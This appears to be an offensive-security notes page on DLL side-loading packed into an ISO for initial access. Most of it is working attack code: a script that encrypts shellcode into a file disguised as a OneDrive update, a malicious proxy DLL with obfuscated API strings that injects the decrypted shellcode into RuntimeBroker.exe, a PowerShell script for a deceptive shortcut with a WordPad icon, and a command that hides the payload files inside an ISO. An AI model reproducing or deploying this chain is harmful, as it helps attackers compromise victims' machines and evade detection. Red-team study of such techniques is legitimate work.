# DLL Side-Loading

- [https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads](https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads)

{% embed url="https://youtu.be/3eROsG_WNpE" %}




## Combining with ISO Packing

- [https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
- [https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/](https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/)
- [https://github.com/ChoiSG/OneDriveUpdaterSideloading](https://github.com/ChoiSG/OneDriveUpdaterSideloading)

Encrypt your payload:

{% code title="enc.py" %}
```python
from os import urandom
from hashlib import sha256
from Crypto.Cipher import AES

KEY = urandom(16)

def pad(s):
	return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
	cipher = AES.new(sha256(key).digest(), AES.MODE_CBC, 16 * '\x00')
	return cipher.encrypt(bytes(pad(plaintext)))

with open('shellcode.bin', 'rb') as f:
	plaintext = f.read()

print('key[] = { 0x' + ',0x'.join(hex(ord(x))[2:] for x in KEY) + ' };')
with open('OneDrive.Update', 'wb') as f:
	f.write(aesenc(plaintext, KEY))
```
{% endcode %}

Generate a proxy DLL with [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy):

```
Cmd > SharpDllProxy.exe --dll C:\Windows\System32\version.dll --payload OneDrive.Update
Cmd > move output_version\tmp1F94.dll C:\out\vresion.dll
```

Compile a malicious DLL (stolen from [injectopi](https://github.com/peperunas/injectopi/tree/master/CreateSection)):

{% tabs %}
{% tab title="Source" %}
{% code title="dllmain.cpp" %}
```cpp
#include "pch.h"
#include <stdlib.h>
#include <wincrypt.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "CreateSection.h"

#pragma comment(lib, "ntdll")

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

// ...pragma export redirections from version_pragma.c...

void XOR(char* data, size_t data_len) {
    const char key[] = "opzlxkncgtoqapweldg";

    int j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == sizeof(key) - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

BOOL LoadNtdllFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    char ZwOpenProcess_str[] = { 0x35,0x07,0x35,0x1c,0x1d,0x05,0x3e,0x11,0x08,0x17,0x0a,0x02,0x12,0x00 };
    XOR((char*)ZwOpenProcess_str, 13);
    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, ZwOpenProcess_str);
    if (ZwOpenProcess == NULL) return FALSE;

    char ZwCreateSection_str[] = { 0x35,0x07,0x39,0x1e,0x1d,0x0a,0x1a,0x06,0x34,0x11,0x0c,0x05,0x08,0x1f,0x19,0x00 };
    XOR((char*)ZwCreateSection_str, 15);
    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))GetProcAddress(ntdll, ZwCreateSection_str);
    if (ZwCreateSection == NULL) return FALSE;

    char ZwMapViewOfSection_str[] = { 0x35,0x07,0x37,0x0d,0x08,0x3d,0x07,0x06,0x10,0x3b,0x09,0x22,0x04,0x13,0x03,0x0c,0x03,0x0a,0x00 };
    XOR((char*)ZwMapViewOfSection_str, 18);
    ZwMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))GetProcAddress(ntdll, ZwMapViewOfSection_str);
    if (ZwMapViewOfSection == NULL) return FALSE;

    char ZwCreateThreadEx_str[] = { 0x35,0x07,0x39,0x1e,0x1d,0x0a,0x1a,0x06,0x33,0x1c,0x1d,0x14,0x00,0x14,0x32,0x1d,0x00 };
    XOR((char*)ZwCreateThreadEx_str, 16);
    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))GetProcAddress(ntdll, ZwCreateThreadEx_str);
    if (ZwCreateThreadEx == NULL) return FALSE;

    char ZwDelayExecution_str[] = { 0x35,0x07,0x3e,0x09,0x14,0x0a,0x17,0x26,0x1f,0x11,0x0c,0x04,0x15,0x19,0x18,0x0b,0x00 };
    XOR((char*)ZwDelayExecution_str, 16);
    ZwDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, ZwDelayExecution_str);
    if (ZwDelayExecution == NULL) return FALSE;

    char ZwClose_str[] = { 0x35,0x07,0x39,0x00,0x17,0x18,0x0b };
    XOR((char*)ZwClose_str, 7);
    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, ZwClose_str);
    if (ZwClose == NULL) return FALSE;

    return TRUE;
}

HANDLE GetProcHandlebyName(const char* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = NULL;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid = { (HANDLE)entry.th32ProcessID, NULL };
                InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);

                status = ZwOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

                if (!NT_SUCCESS(status))
                    continue;

                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    ZwClose(snapshot);

    return NULL;
}

// Credit: Sektor7 RTO Malware Essential Course
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) return -1;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) return -1;

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

DWORD WINAPI Run(LPVOID lpParameter) {
    if (LoadNtdllFunctions() == FALSE)
        return -1;

    char RuntimeBroker_str[] = { 0x3d,0x05,0x14,0x18,0x11,0x06,0x0b,0x21,0x15,0x1b,0x04,0x14,0x13,0x5e,0x12,0x1d,0x09,0x00 };
    XOR((char*)RuntimeBroker_str, 17);
    HANDLE hProc = GetProcHandlebyName(RuntimeBroker_str);
    if (hProc == NULL)
        return -1;

    FILE* fp;
    size_t shellcodeSize;
    unsigned char* shellcode;
    char OneDriveUpdate_str[] = { 0x20,0x1e,0x1f,0x28,0x0a,0x02,0x18,0x06,0x49,0x21,0x1f,0x15,0x00,0x04,0x12,0x00 };
    XOR((char*)OneDriveUpdate_str, 15);
    fp = fopen(OneDriveUpdate_str, "rb");
    fseek(fp, 0, SEEK_END);
    shellcodeSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    shellcode = (unsigned char*)malloc(shellcodeSize);
    fread(shellcode, shellcodeSize, 1, fp);

    char key[] = { 0x13,0x33,0x33,0x37 };
    AESDecrypt((char*)shellcode, shellcodeSize, key, sizeof(key));

    HANDLE hSection = NULL;
    SIZE_T size = shellcodeSize;
    LARGE_INTEGER sectionSize = { size };
    NTSTATUS status = NULL;

    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
        return -1;

    PVOID pLocalView = NULL, pRemoteView = NULL;
    if ((status = ZwMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE)) != STATUS_SUCCESS)
        return -1;

    memcpy(pLocalView, shellcode, shellcodeSize);

    if ((status = ZwMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
        return -1;

    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);

    if ((status = ZwDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
        return -1;

    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS)
        return -1;

    ResumeThread(hThread);

    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = ZwDelayExecution(TRUE, &interval)) != STATUS_SUCCESS)
        return -1;

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    HANDLE threadHandle;

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, Run, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        Sleep(5000);
        break;
    }

    return TRUE;
}
```
{% endcode %}
{% endtab %}
{% tab title="Include" %}
{% code title="CreateSection.h" %}
```cpp
#pragma once
#include <Windows.h>
#include <stdio.h>

#if !defined NTSTATUS
typedef LONG NTSTATUS;
#endif

#define STATUS_SUCCESS 0
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) == STATUS_SUCCESS)

#if !defined PROCESSINFOCLASS
typedef LONG PROCESSINFOCLASS;
#endif

#if !defined PPEB
typedef struct _PEB* PPEB;
#endif

#if !defined PROCESS_BASIC_INFORMATION
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
#endif;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;
#define InitializeObjectAttributes( p, n, a, r, s ) { \
        (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
        (p)->RootDirectory = r;                           \
        (p)->Attributes = a;                              \
        (p)->ObjectName = n;                              \
        (p)->SecurityDescriptor = s;                      \
        (p)->SecurityQualityOfService = NULL;             \
        }

NTSTATUS(NTAPI* ZwCreateSection)
(_Out_ PHANDLE SectionHandle, _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PLARGE_INTEGER MaximumSize, _In_ ULONG SectionPageProtection,
    _In_ ULONG AllocationAttributes, _In_opt_ HANDLE FileHandle);

NTSTATUS(NTAPI* ZwMapViewOfSection)
(_In_ HANDLE SectionHandle, _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset, _Inout_ PSIZE_T ViewSize,
    _In_ DWORD InheritDisposition, _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

NTSTATUS(NTAPI* ZwCreateThreadEx)
(_Out_ PHANDLE ThreadHandle, _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes, _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine, _In_opt_ PVOID Argument, _In_ ULONG CreateFlags,
    _In_opt_ ULONG_PTR ZeroBits, _In_opt_ SIZE_T StackSize,
    _In_opt_ SIZE_T MaximumStackSize, _In_opt_ PVOID AttributeList);

NTSTATUS(NTAPI* ZwUnmapViewOfSection)(_In_ HANDLE ProcessHandle, _In_opt_ PVOID BaseAddress);
NTSTATUS(NTAPI* ZwClose)(_In_ HANDLE Handle);
NTSTATUS(NTAPI* ZwOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
NTSTATUS(NTAPI* ZwDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval);
```
{% endcode %}
{% endtab %}
{% endtabs %}

Create a malicious link:

```powershell
$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("C:\out\clickme.lnk")
$link.windowstyle = "7"
$link.targetpath = "%windir%/system32/cmd.exe"
$link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
$link.arguments = "/c start OneDriveStandaloneUpdater.exe"
$link.save()
```

Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/PackMyPayload):

```
PS > python .\PackMyPayload.py C:\out\ C:\out\openme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
```
